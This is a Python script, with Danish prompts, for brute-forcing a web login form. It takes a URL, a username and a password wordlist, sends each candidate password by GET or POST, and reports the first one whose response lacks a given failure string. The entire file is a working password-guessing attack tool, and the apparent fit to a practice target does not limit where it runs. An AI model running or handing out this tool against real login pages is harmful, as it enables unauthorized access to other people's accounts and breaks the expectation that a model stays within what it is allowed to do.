import requests
import os
from termcolor import colored
os.system('title TheMach1neDK Bruteforce')
os.system('color 0A')
os.system('cls')

url = input('[+] Indsæt URL: ')
username = input('[+] Indsæt Username på bruteforce konto: ')
password_file = input('[+] Indsæt Wordlist med passwords: ')
login_failed_string = input('[+] Indtast string som kommer ved login (Ikke Krav): ')
cookie_value = input('Indtast Cookies (Ikke krav): ')


def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		data = {'username':username,'password':password,'Login':'submit'}
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()




with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password er ikke i listen')


